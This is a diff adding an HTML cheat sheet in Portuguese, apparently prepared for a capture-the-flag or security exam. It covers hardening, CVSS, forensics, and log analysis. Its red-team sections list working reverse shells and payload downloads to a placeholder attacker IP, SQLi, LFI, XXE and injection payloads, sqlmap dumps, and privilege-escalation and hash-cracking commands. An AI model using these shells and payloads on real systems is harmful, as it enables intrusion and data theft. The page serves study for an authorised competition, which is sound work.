+<span class="c"># WAF: a2enmod security2 (ModSecurity)</span></code></pre></div>
+  <div class="block"><p class="blabel">Nginx (nginx.conf / server block)</p>
+  <pre><code>server_tokens off;         <span class="c"># esconde versão</span>
+autoindex off;             <span class="c"># sem listagem</span>
+add_header X-Frame-Options "DENY" always;
+add_header X-Content-Type-Options "nosniff" always;
+add_header Strict-Transport-Security "max-age=31536000" always;
+add_header Content-Security-Policy "default-src 'self'" always;
+<span class="c"># bloquear métodos:</span>
+if ($request_method !~ ^(GET|POST|HEAD)$) { return 405; }
+<span class="c"># TLS forte:</span>
+ssl_protocols TLSv1.2 TLSv1.3;
+ssl_ciphers HIGH:!aNULL:!MD5;</code></pre></div>
+  </div>
+  <div class="tbl"><table>
+  <tr><th>Header</th><th>Protege contra</th></tr>
+  <tr><td><code>Strict-Transport-Security</code></td><td>Downgrade p/ HTTP, SSL strip</td></tr>
+  <tr><td><code>Content-Security-Policy</code></td><td>XSS, injeção de recursos</td></tr>
+  <tr><td><code>X-Frame-Options</code></td><td>Clickjacking</td></tr>
+  <tr><td><code>X-Content-Type-Options</code></td><td>MIME sniffing</td></tr>
+  <tr><td><code>Referrer-Policy</code></td><td>Vazamento de URL</td></tr>
+  </table></div>
+</section>
+
+<!-- ============ 2 CVSS ============ -->
+<section id="cvss">
+  <h3><span class="num">2</span>CVSS 3.1 — pontuação de vulnerabilidades</h3>
+  <p class="lede">Módulo offline: você <b>identifica e classifica</b>, não corrige. Decore as 8 métricas base. Calculadora: <code class="inl">first.org/cvss/calculator/3.1</code>.</p>
+
+  <h4 class="a">Métricas base (o vetor)</h4>
+  <div class="tbl"><table>
+  <tr><th>Métrica</th><th>Sigla</th><th>Valores</th><th>Nota mental</th></tr>
+  <tr><td>Attack Vector</td><td><code>AV</code></td><td>N / A / L / P</td><td>Network = pior (remoto)</td></tr>
+  <tr><td>Attack Complexity</td><td><code>AC</code></td><td>L / H</td><td>Low = mais grave</td></tr>
+  <tr><td>Privileges Required</td><td><code>PR</code></td><td>N / L / H</td><td>None = mais grave</td></tr>
+  <tr><td>User Interaction</td><td><code>UI</code></td><td>N / R</td><td>None = mais grave</td></tr>
+  <tr><td>Scope</td><td><code>S</code></td><td>U / C</td><td>Changed = escapa do componente</td></tr>
+  <tr><td>Confidentiality</td><td><code>C</code></td><td>H / L / N</td><td>impacto em sigilo</td></tr>
+  <tr><td>Integrity</td><td><code>I</code></td><td>H / L / N</td><td>impacto em dados</td></tr>
+  <tr><td>Availability</td><td><code>A</code></td><td>H / L / N</td><td>impacto em disponibilidade</td></tr>
+  </table></div>
+
+  <h4 class="a">Faixas de severidade</h4>
+  <div class="tbl"><table>
+  <tr><th>Score</th><th>Severidade</th></tr>
+  <tr><td><span class="sev none">0.0</span></td><td class="none">None</td></tr>
+  <tr><td><span class="sev low">0.1 – 3.9</span></td><td class="low">Low</td></tr>
+  <tr><td><span class="sev med">4.0 – 6.9</span></td><td class="med">Medium</td></tr>
+  <tr><td><span class="sev high">7.0 – 8.9</span></td><td class="high">High</td></tr>
+  <tr><td><span class="sev crit">9.0 – 10.0</span></td><td class="crit">Critical</td></tr>
+  </table></div>
+
+  <h4 class="a">Exemplos de vetor</h4>
+  <pre><code><span class="c"># SQLi remota sem autenticação, dump total do banco</span>
+CVSS:3.1/<span class="k">AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</span>   -> 9.1 Critical
+
+<span class="c"># XSS refletido (precisa a vítima clicar) — escapa p/ o navegador dela</span>
+CVSS:3.1/<span class="k">AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span>   -> 6.1 Medium
+
+<span class="c"># Privesc local (precisa já estar logado)</span>
+CVSS:3.1/<span class="k">AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</span>   -> 7.8 High</code></pre>
+  <div class="tip"><b>Reflexo:</b> comece sempre por <b>AV</b> (é remoto?) e <b>PR/UI</b> (precisa de credencial/clique?). Isso já define ~70% da nota. Depois avalie o tripé <b>C/I/A</b>. Classifique também o <b>tipo</b>: SQLi, XSS, RCE, path traversal, IDOR, CSRF, deserialization, etc.</div>
+</section>
+
+<!-- ============ 3a Volatility ============ -->
+<section id="volatility">
+  <h3><span class="num">3a</span>Forense de memória — Volatility</h3>
+  <p class="lede">Análise de dump de RAM. Volatility 3 não precisa de profile; o 2 precisa.</p>
+  <div class="block"><p class="blabel">Volatility 3 (recomendado)</p>
+  <pre><code><span class="k">vol</span> -f dump.raw windows.info          <span class="c"># SO, build</span>
+<span class="k">vol</span> -f dump.raw windows.pslist         <span class="c"># processos</span>
+<span class="k">vol</span> -f dump.raw windows.pstree         <span class="c"># árvore (pai/filho)</span>
+<span class="k">vol</span> -f dump.raw windows.psscan         <span class="c"># inclui processos ocultos/mortos</span>
+<span class="k">vol</span> -f dump.raw windows.cmdline        <span class="c"># linha de comando de cada proc</span>
+<span class="k">vol</span> -f dump.raw windows.netscan        <span class="c"># conexões de rede</span>
+<span class="k">vol</span> -f dump.raw windows.malfind        <span class="c"># código injetado / suspeito</span>
+<span class="k">vol</span> -f dump.raw windows.dlllist --pid 1234
+<span class="k">vol</span> -f dump.raw windows.filescan       <span class="c"># arquivos em memória</span>
+<span class="k">vol</span> -f dump.raw windows.hashdump       <span class="c"># hashes de senha (SAM)</span>
+<span class="k">vol</span> -f dump.raw windows.registry.hivelist
+<span class="c"># Linux:</span> vol -f dump.raw linux.pslist / linux.bash (histórico!)</code></pre></div>
+  <div class="block"><p class="blabel">Volatility 2 (fallback)</p>
+  <pre><code><span class="k">vol.py</span> -f dump.raw imageinfo          <span class="c"># descobrir o profile</span>
+<span class="k">vol.py</span> -f dump.raw --profile=Win7SP1x64 pslist
+<span class="k">vol.py</span> ... pstree / netscan / cmdline / malfind / hashdump</code></pre></div>
+  <div class="block"><p class="blabel">Truque: flag escondida na RAM</p>
+  <pre><code><span class="k">strings</span> dump.raw | grep -i <span class="s">"flag{"</span>
+<span class="k">strings</span> -e l dump.raw | grep -i <span class="s">"CTF"</span>    <span class="c"># -e l = UTF-16 (Windows)</span></code></pre></div>
+</section>
+
+<!-- ============ 3b PCAP ============ -->
+<section id="pcap">
+  <h3><span class="num">3b</span>Forense de rede — PCAP</h3>
+  <p class="lede">Wireshark (GUI) e tshark (CLI). Procure credenciais em protocolo texto, exfiltração e ferramentas de ataque.</p>
+  <h4>Filtros de exibição do Wireshark</h4>
+  <div class="tbl"><table>
+  <tr><th>Filtro</th><th>Mostra</th></tr>
+  <tr><td><code>http.request</code></td><td>requisições HTTP</td></tr>
+  <tr><td><code>http.request.method == "POST"</code></td><td>POSTs (logins, uploads)</td></tr>
+  <tr><td><code>ip.addr == 10.0.0.5</code></td><td>tráfego de/para um host</td></tr>
+  <tr><td><code>tcp.port == 21 || ftp</code></td><td>FTP (creds em texto)</td></tr>
+  <tr><td><code>dns</code></td><td>consultas DNS (exfil / C2)</td></tr>
+  <tr><td><code>tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0</code></td><td>port scan (muitos SYN)</td></tr>
+  <tr><td><code>frame contains "password"</code></td><td>busca string no pacote</td></tr>
+  </table></div>
+  <p class="note">Clique direito no pacote → <b>Follow &gt; TCP Stream</b> para ver a conversa inteira. <b>File &gt; Export Objects &gt; HTTP</b> para extrair arquivos transferidos.</p>
+  <div class="block"><p class="blabel">tshark (linha de comando)</p>
+  <pre><code><span class="k">tshark</span> -r cap.pcap -Y <span class="s">"http.request"</span> -T fields -e ip.src -e http.host -e http.request.uri
+<span class="k">tshark</span> -r cap.pcap -Y <span class="s">"ftp"</span> -T fields -e ftp.request.command -e ftp.request.arg
+<span class="k">tshark</span> -r cap.pcap -qz io,phs             <span class="c"># hierarquia de protocolos</span>
+<span class="k">tshark</span> -r cap.pcap -qz conv,tcp           <span class="c"># conversas TCP</span>
+<span class="k">tshark</span> -r cap.pcap --export-objects http,./out   <span class="c"># extrair arquivos</span>
+<span class="c"># NetworkMiner: extrai creds/arquivos/imagens automaticamente (GUI)</span></code></pre></div>
+</section>
+
+<!-- ============ 3c Disk ============ -->
+<section id="disk">
+  <h3><span class="num">3c</span>Forense de disco & arquivos</h3>
+  <pre><code><span class="c"># Sleuth Kit — analisar imagem de disco</span>
+<span class="k">mmls</span> disk.img                    <span class="c"># tabela de partições / offsets</span>
+<span class="k">fls</span> -r -o 2048 disk.img          <span class="c"># listar arquivos (inc. deletados *)</span>
+<span class="k">icat</span> -o 2048 disk.img 1234        <span class="c"># extrair arquivo pelo inode</span>
+<span class="c"># Carving / arquivos embutidos</span>
+<span class="k">binwalk</span> arquivo                   <span class="c"># identifica/extrai (-e) conteúdo embutido</span>
+<span class="k">foremost</span> -i disk.img -o out       <span class="c"># recuperar por assinatura</span>
+<span class="k">exiftool</span> imagem.jpg               <span class="c"># metadados (GPS, autor, software)</span>
+<span class="c"># Sempre útil</span>
+<span class="k">file</span> desconhecido                 <span class="c"># tipo real do arquivo</span>
+<span class="k">strings</span> -n 8 arquivo | less        <span class="c"># texto legível</span>
+<span class="k">xxd</span> arquivo | head                 <span class="c"># hex dump (ver magic bytes)</span>
+<span class="k">sha256sum</span> evidencia               <span class="c"># cadeia de custódia / integridade</span></code></pre>
+  <div class="tip"><b>Steganografia (comum em CTF):</b> <code class="inl">steghide extract -sf img.jpg</code> · <code class="inl">zsteg img.png</code> · <code class="inl">exiftool</code> · comentário no fim do arquivo com <code class="inl">strings</code>.</div>
+</section>
+
+<!-- ============ 4a Linux logs ============ -->
+<section id="linuxlog">
+  <h3><span class="num">4a</span>Blue Team — logs Linux</h3>
+  <div class="tbl"><table>
+  <tr><th>Arquivo</th><th>Contém</th></tr>
+  <tr><td><code>/var/log/auth.log</code> (Debian)</td><td>SSH, sudo, logins</td></tr>
+  <tr><td><code>/var/log/secure</code> (RHEL)</td><td>idem</td></tr>
+  <tr><td><code>/var/log/syslog</code></td><td>sistema geral</td></tr>
+  <tr><td><code>/var/log/apache2/</code>, <code>nginx/</code></td><td>access.log, error.log</td></tr>
+  <tr><td><code>last</code> / <code>lastb</code></td><td>logins ok / falhos (wtmp/btmp)</td></tr>
+  <tr><td><code>~/.bash_history</code></td><td>comandos do atacante</td></tr>
+  </table></div>
+  <pre><code><span class="c"># brute force SSH</span>
+<span class="k">grep</span> <span class="s">"Failed password"</span> /var/log/auth.log | awk <span class="s">'{print $(NF-3)}'</span> | sort | uniq -c | sort -rn
+<span class="c"># login que teve SUCESSO (após tentativas = comprometido)</span>
+<span class="k">grep</span> <span class="s">"Accepted"</span> /var/log/auth.log
+<span class="c"># uso de sudo</span>
+<span class="k">grep</span> <span class="s">"sudo:"</span> /var/log/auth.log
+<span class="c"># criação de usuário / mudança</span>
+<span class="k">grep</span> -E <span class="s">"useradd|new user|passwd changed"</span> /var/log/auth.log
+<span class="c"># top IPs de tentativas falhas</span>
+<span class="k">lastb</span> | awk <span class="s">'{print $3}'</span> | sort | uniq -c | sort -rn | head</code></pre>
+</section>
+
+<!-- ============ 4b Windows logs ============ -->
+<section id="winlog">
+  <h3><span class="num">4b</span>Blue Team — logs Windows (Event IDs)</h3>
+  <div class="tbl"><table>
+  <tr><th>Event ID</th><th>Evento</th><th>Por que importa</th></tr>
+  <tr><td><code>4624</code></td><td>Logon com sucesso</td><td>ver Logon Type (3=rede, 10=RDP)</td></tr>
+  <tr><td><code>4625</code></td><td>Falha de logon</td><td>vários = brute force</td></tr>
+  <tr><td><code>4634 / 4647</code></td><td>Logoff</td><td>timeline de sessão</td></tr>
+  <tr><td><code>4672</code></td><td>Privilégios especiais no logon</td><td>logon administrativo</td></tr>
+  <tr><td><code>4688</code></td><td>Criação de processo</td><td>o que foi executado</td></tr>
+  <tr><td><code>4720</code></td><td>Conta de usuário criada</td><td>persistência</td></tr>
+  <tr><td><code>4732 / 4728</code></td><td>Membro add a grupo admin</td><td>escalada</td></tr>
+  <tr><td><code>7045</code></td><td>Serviço instalado</td><td>persistência / malware</td></tr>
+  <tr><td><code>1102</code></td><td>Log de auditoria LIMPO</td><td>anti-forense (alerta!)</td></tr>
+  <tr><td><code>4104</code></td><td>PowerShell ScriptBlock</td><td>scripts maliciosos</td></tr>
+  </table></div>
+  <pre><code><span class="c"># PowerShell — consultar Event Log</span>
+<span class="k">Get-WinEvent</span> -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 50
+<span class="k">Get-WinEvent</span> -FilterHashtable @{LogName='Security';Id=4624} |
+  ? {$_.Message -match "Logon Type:\s+10"}      <span class="c"># só RDP</span>
+<span class="k">wevtutil</span> qe Security /q:"*[System[(EventID=4625)]]" /f:text /c:20
+<span class="c"># Padrão de brute force bem-sucedido: N x 4625 seguido de 4624 do mesmo IP</span></code></pre>
+  <div class="tip"><b>Fluxo de investigação:</b> IP/origem do atacante → conta comprometida → 4688/4104 (o que executou) → 4720/7045 (persistência) → 4732 (escalada). Muitas flags pedem exatamente "qual IP", "qual usuário", "qual processo".</div>
+</section>
+
+<!-- ============ 4c Web logs ============ -->
+<section id="weblog">
+  <h3><span class="num">4c</span>Blue Team — logs de servidor web</h3>
+  <pre><code><span class="c"># top IPs por nº de requisições</span>
+<span class="k">awk</span> <span class="s">'{print $1}'</span> access.log | sort | uniq -c | sort -rn | head
+<span class="c"># assinaturas de ataque (SQLi, LFI, XSS, scanners)</span>
+<span class="k">grep</span> -Ei <span class="s">"union.*select|or 1=1|\.\./|/etc/passwd|&lt;script|base64_|cmd="</span> access.log
+<span class="c"># scanners por User-Agent</span>
+<span class="k">grep</span> -Ei <span class="s">"sqlmap|nikto|nmap|dirbuster|gobuster|hydra"</span> access.log
+<span class="c"># respostas 200 em URLs de ataque (deu certo!)</span>
+<span class="k">grep</span> <span class="s">"admin"</span> access.log | grep <span class="s">' 200 '</span>
+<span class="c"># muitos 404 do mesmo IP = fuzzing de diretório</span>
+<span class="k">awk</span> <span class="s">'$9==404{print $1}'</span> access.log | sort | uniq -c | sort -rn</code></pre>
+  <p class="note">Formato padrão (combined): <code class="inl">IP - user [data] "MÉTODO url HTTP" status tamanho "referer" "user-agent"</code>. Campo $1=IP, $9=status.</p>
+</section>
+
+<!-- ============ 5a Recon ============ -->
+<section id="recon">
+  <h3><span class="num">5a</span>Red Team — recon & enumeração</h3>
+  <pre><code><span class="c"># Nmap</span>
+<span class="k">nmap</span> -sC -sV -oN scan.txt <span class="v">ALVO</span>       <span class="c"># scripts default + versões</span>
+<span class="k">nmap</span> -p- --min-rate 5000 <span class="v">ALVO</span>          <span class="c"># todas as 65535 portas, rápido</span>
+<span class="k">nmap</span> -sU --top-ports 20 <span class="v">ALVO</span>           <span class="c"># UDP comuns</span>
+<span class="k">nmap</span> --script vuln <span class="v">ALVO</span>                <span class="c"># checagem de vulns conhecidas</span>
+<span class="c"># Diretórios / arquivos web</span>
+<span class="k">gobuster</span> dir -u http://<span class="v">ALVO</span> -w /usr/share/wordlists/dirb/common.txt -x php,txt
+<span class="k">ffuf</span> -u http://<span class="v">ALVO</span>/FUZZ -w wordlist.txt -mc 200,301,302
+<span class="c"># Subdomínios / vhosts</span>
+<span class="k">ffuf</span> -u http://<span class="v">ALVO</span> -H <span class="s">"Host: FUZZ.alvo.com"</span> -w subs.txt -fs 0
+<span class="c"># Web scanner</span>
+<span class="k">nikto</span> -h http://<span class="v">ALVO</span>
+<span class="c"># SMB / serviços</span>
+<span class="k">enum4linux</span> -a <span class="v">ALVO</span> ; smbclient -L //<span class="v">ALVO</span> -N</code></pre>
+</section>
+
+<!-- ============ 5b Web exploit ============ -->
+<section id="webexploit">
+  <h3><span class="num">5b</span>Red Team — exploração web</h3>
+  <div class="tbl"><table>
+  <tr><th>Vuln</th><th>Payload / teste</th></tr>
+  <tr><td>SQLi (auth bypass)</td><td><code>' OR '1'='1'-- -</code></td></tr>
+  <tr><td>SQLi (union)</td><td><code>' UNION SELECT null,version()-- -</code></td></tr>
+  <tr><td>LFI</td><td><code>../../../../etc/passwd</code></td></tr>
+  <tr><td>LFI (PHP wrapper)</td><td><code>php://filter/convert.base64-encode/resource=index.php</code></td></tr>
+  <tr><td>Command injection</td><td><code>; id</code> · <code>| whoami</code> · <code>`id`</code> · <code>$(id)</code></td></tr>
+  <tr><td>XSS</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> · <code>&lt;img src=x onerror=alert(1)&gt;</code></td></tr>
+  <tr><td>SSTI</td><td><code>{{7*7}}</code> → 49 ? · <code>${7*7}</code></td></tr>
+  <tr><td>XXE</td><td><code>&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;</code></td></tr>
+  <tr><td>IDOR</td><td>trocar <code>id=1</code> → <code>id=2</code> na URL/POST</td></tr>
+  </table></div>
+  <div class="block"><p class="blabel">sqlmap (automatizado)</p>
+  <pre><code><span class="k">sqlmap</span> -u <span class="s">"http://ALVO/item?id=1"</span> --batch --dbs
+<span class="k">sqlmap</span> -u <span class="s">"http://ALVO/item?id=1"</span> -D loja --tables
+<span class="k">sqlmap</span> -u <span class="s">"http://ALVO/item?id=1"</span> -D loja -T users --dump
+<span class="k">sqlmap</span> -r request.txt --batch          <span class="c"># a partir de request salvo do Burp</span></code></pre></div>
+</section>
+
+<!-- ============ 5c Shells ============ -->
+<section id="shells">
+  <h3><span class="num">5c</span>Red Team — reverse shells & transferência</h3>
+  <div class="block"><p class="blabel">Listener (na sua máquina)</p>
+  <pre><code><span class="k">nc</span> -lvnp 4444
+<span class="c"># ou rlwrap nc -lvnp 4444 (histórico + setas)</span></code></pre></div>
+  <div class="block"><p class="blabel">Reverse shells (no alvo) — troque IP/porta</p>
+  <pre><code><span class="c"># Bash</span>
+bash -i >& /dev/tcp/<span class="v">10.0.0.1</span>/4444 0>&1
+<span class="c"># Python</span>
+python3 -c <span class="s">'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'</span>
+<span class="c"># Netcat</span>
+nc -e /bin/bash <span class="v">10.0.0.1</span> 4444
+<span class="c"># PowerShell (Windows)</span>
+powershell -nop -c <span class="s">"$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);..."</span></code></pre></div>
+  <div class="block"><p class="blabel">Estabilizar TTY (shell decente)</p>
+  <pre><code>python3 -c <span class="s">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="c"># Ctrl+Z, depois:</span>  stty raw -echo; fg  <span class="c"># Enter Enter</span>
+export TERM=xterm</code></pre></div>
+  <div class="block"><p class="blabel">Transferência de arquivos</p>
+  <pre><code><span class="c"># Servidor HTTP rápido (atacante)</span>
+python3 -m http.server 8000
+<span class="c"># Baixar no alvo</span>
+wget http://<span class="v">10.0.0.1</span>:8000/file    |   curl -O http://10.0.0.1:8000/file
+<span class="c"># Windows</span>
+certutil -urlcache -f http://<span class="v">10.0.0.1</span>:8000/f.exe f.exe
+powershell iwr http://<span class="v">10.0.0.1</span>:8000/f.exe -OutFile f.exe
+<span class="c"># scp</span>
+scp arquivo user@host:/tmp/</code></pre></div>
+</section>
+
+<!-- ============ 5d Privesc ============ -->
+<section id="privesc">
+  <h3><span class="num">5d</span>Red Team — escalada de privilégios</h3>
+  <div class="grid2">
+  <div class="block"><p class="blabel">Linux</p>
+  <pre><code><span class="k">sudo</span> -l                       <span class="c"># o que posso rodar como root</span>
+<span class="k">find</span> / -perm -4000 2>/dev/null  <span class="c"># binários SUID -&gt; GTFOBins</span>
+<span class="k">getcap</span> -r / 2>/dev/null         <span class="c"># capabilities</span>
+cat /etc/crontab ; ls -la /etc/cron*  <span class="c"># tarefas agendadas</span>
+uname -a                        <span class="c"># kernel (exploit?)</span>
+<span class="c"># automatizado: linpeas.sh / linenum.sh</span>
+<span class="c"># consultar GTFOBins p/ escapar de binário SUID/sudo</span></code></pre></div>
+  <div class="block"><p class="blabel">Windows</p>
+  <pre><code>whoami /priv                    <span class="c"># privilégios (SeImpersonate!)</span>
+whoami /groups
+<span class="k">Get-Service</span> | ? {$_.StartType -eq 'Automatic'}
+sc qc &lt;servico&gt;                  <span class="c"># binpath (unquoted path?)</span>
+<span class="c"># automatizado: winPEAS.exe / PowerUp.ps1</span>
+<span class="c"># senhas em: registro, arquivos de config, histórico do PowerShell</span>
+reg query HKLM /f password /t REG_SZ /s</code></pre></div>
+  </div>
+  <div class="warn"><b>GTFOBins / LOLBAS estão no GitHub (bloqueado na prova).</b> Espelhe antes numa página pública sua os binários que você mais usa (ex.: <code class="inl">find</code>, <code class="inl">vim</code>, <code class="inl">python</code>, <code class="inl">tar</code>, <code class="inl">nmap</code> — todos com técnica de escape via SUID/sudo).</div>
+</section>
+
+<!-- ============ 5e Crypto ============ -->
+<section id="crypto">
+  <h3><span class="num">5e</span>Red Team — criptografia & hashes</h3>
+  <p class="lede">Regra de ouro: <b>primeiro identifique o esquema</b>, depois ataque. CyberChef (baixe offline) resolve a maioria de encoding.</p>
+
+  <h4 class="r">Identificar & decodificar</h4>
+  <pre><code><span class="c"># Encodings comuns</span>
+echo <span class="s">"aGVsbG8="</span> | base64 -d        <span class="c"># Base64 (termina em = )</span>
+echo <span class="s">"68656c6c6f"</span> | xxd -r -p       <span class="c"># Hex</span>
+echo <span class="s">"uryyb"</span> | tr <span class="s">'A-Za-z'</span> <span class="s">'N-ZA-Mn-za-m'</span>  <span class="c"># ROT13</span>
+<span class="c"># CyberChef: "Magic" detecta automaticamente base/hex/rot/XOR encadeados</span>
+<span class="c"># Cifra de substituição -> análise de frequência (quipqiup.com)</span></code></pre>
+
+  <h4 class="r">Quebra de hash</h4>
+  <pre><code><span class="c"># identificar tipo pelo formato/tamanho</span>
+hashid <span class="s">'5f4dcc3b5aa765d61d8327deb882cf99'</span>   <span class="c"># 32 hex = MD5</span>
+<span class="c"># John</span>
+<span class="k">john</span> --wordlist=rockyou.txt hashes.txt
+<span class="k">john</span> --show hashes.txt
+<span class="c"># Hashcat (-m = modo)  0=MD5 100=SHA1 1400=SHA256 1800=sha512crypt 3200=bcrypt</span>
+<span class="k">hashcat</span> -m 0 -a 0 hashes.txt rockyou.txt
+<span class="c"># hash de arquivo protegido -&gt; john</span>
+zip2john x.zip &gt; h ; rar2john x.rar &gt; h ; ssh2john id_rsa &gt; h</code></pre>
+
+  <h4 class="r">RSA & XOR (CTF)</h4>
+  <pre><code><span class="c"># RSA com n pequeno: fatorar em factordb.com para achar p,q</span>
+<span class="c"># depois: d = inverso(e, (p-1)(q-1)) ; m = c^d mod n</span>
+<span class="c"># XOR single-byte: força bruta das 256 chaves</span>
+python3 -c <span class="s">"ct=bytes.fromhex('...'); [print(k, bytes(b^k for b in ct)) for k in range(256)]"</span>
+<span class="c"># chave conhecida em texto? XOR ct com known-plaintext revela a chave</span></code></pre>
+  <div class="tip"><b>Ferramentas públicas liberadas (sem login):</b> cyberchef.org · factordb.com · dcode.fr · quipqiup.com · crackstation.net (hashes já quebrados).</div>
+</section>
+
+  <div class="footer">
+    OPSEC Field Manual · referência de estudo · Espelhe seus recursos favoritos do GitHub numa página pública ANTES da prova (GitHub é bloqueado).<br>
+    Uso educacional em ambiente autorizado de competição.
+  </div>
+</main>
+
+<script>
+// ---- Copy buttons ----
+document.querySelectorAll('pre').forEach(pre=>{
+  const bar=document.createElement('div');bar.className='bar';
+  bar.innerHTML='<span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="ttl">shell</span>';
+  pre.insertBefore(bar,pre.firstChild);
+  const btn=document.createElement('button');btn.className='copy';btn.textContent='copiar';
+  btn.onclick=()=>{
+    const code=pre.querySelector('code').innerText;
+    navigator.clipboard.writeText(code).then(()=>{
+      btn.textContent='copiado ✓';btn.classList.add('done');
+      setTimeout(()=>{btn.textContent='copiar';btn.classList.remove('done')},1400);
+    });
+  };
+  pre.appendChild(btn);
+});
+
+// ---- Live search / filter ----
+const search=document.getElementById('search');
+const sections=[...document.querySelectorAll('section')];
+const nores=document.getElementById('nores');
+search.addEventListener('input',()=>{
+  const q=search.value.trim().toLowerCase();
+  let anyVisible=false;
+  sections.forEach(sec=>{
+    if(!q){sec.style.display='';anyVisible=true;
+      sec.querySelectorAll('pre,.tbl,.block,.warn,.tip,h4,p.note').forEach(el=>el.style.display='');
+      return;}
+    let secMatch=false;
+    // filter at block level
+    sec.querySelectorAll('pre,.tbl,.block').forEach(el=>{
+      const hit=el.innerText.toLowerCase().includes(q);
+      el.style.display=hit?'':'none'; if(hit)secMatch=true;
+    });
+    // section heading text also counts
+    const heading=sec.querySelector('h3').innerText.toLowerCase();
+    if(heading.includes(q)){secMatch=true;
+      sec.querySelectorAll('pre,.tbl,.block').forEach(el=>el.style.display='');}
+    sec.style.display=secMatch?'':'none';
+    if(secMatch)anyVisible=true;
+  });
+  nores.style.display=anyVisible?'none':'block';
+});
+search.addEventListener('keydown',e=>{if(e.key==='Escape'){search.value='';search.dispatchEvent(new Event('input'));}});
+
+// ---- Active nav on scroll ----
+const navlinks=[...document.querySelectorAll('#nav a')];
+const map={};navlinks.forEach(a=>map[a.getAttribute('href').slice(1)]=a);
+const obs=new IntersectionObserver(es=>{
+  es.forEach(e=>{if(e.isIntersecting){
+    navlinks.forEach(a=>a.classList.remove('active'));
+    map[e.target.id]?.classList.add('active');
+  }});
+},{rootMargin:'-20% 0px -70% 0px'});
+sections.forEach(s=>obs.observe(s));
+
+// close mobile menu on link click
+navlinks.forEach(a=>a.addEventListener('click',()=>document.body.classList.remove('open')));
+// keyboard: "/" focuses search
+document.addEventListener('keydown',e=>{if(e.key==='/'&&document.activeElement!==search){e.preventDefault();search.focus();}});
+</script>
+</body>
+</html>
